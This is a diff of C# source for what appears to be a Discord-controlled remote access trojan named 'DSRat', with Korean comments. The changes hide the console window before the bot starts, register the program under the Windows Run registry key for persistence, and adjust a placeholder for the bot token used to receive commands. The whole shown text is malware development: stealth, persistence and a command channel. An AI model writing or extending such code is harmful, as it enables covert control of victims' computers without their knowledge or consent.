@@ -12,30 +12,29 @@ namespace DSRat
 {
     class Program
     {
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
         [DllImport("kernel32.dll")]
         static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
         const int SW_HIDE = 0; // 숨기기
-
         CommandService commands;
         DiscordSocketClient client;
 
         static void Main(string[] args)
         {
-            new Program().BotMain().GetAwaiter().GetResult();
-            MakeThisAppAutoRunOnStartUp();
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
+            new Program().BotMain().GetAwaiter().GetResult();
+            MakeThisAppAutoRunOnStartUp();
         }
         public static void MakeThisAppAutoRunOnStartUp() // 시작프로그램 등록
         {
             RegistryKey rk = Registry.CurrentUser.OpenSubKey
            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
-            rk.SetValue("Discord Rat", Application.ExecutablePath.ToString());
+            rk.SetValue("DiscordRat", Application.ExecutablePath.ToString());
         }
         public async Task BotMain()
         {
@@ -49,7 +48,7 @@ namespace DSRat
             });
 
 
-            await client.LoginAsync(TokenType.Bot, "Token Here"); //봇의 토큰을 사용해 서버에 로그인
+            await client.LoginAsync(TokenType.Bot, "Discord Bot Token Here"); //봇의 토큰을 사용해 서버에 로그인
             await client.StartAsync();                         //봇이 이벤트를 수신하기 시작
 
             client.MessageReceived += OnClientMessage;         //봇이 메시지를 수신할 때 처리하도록 설정
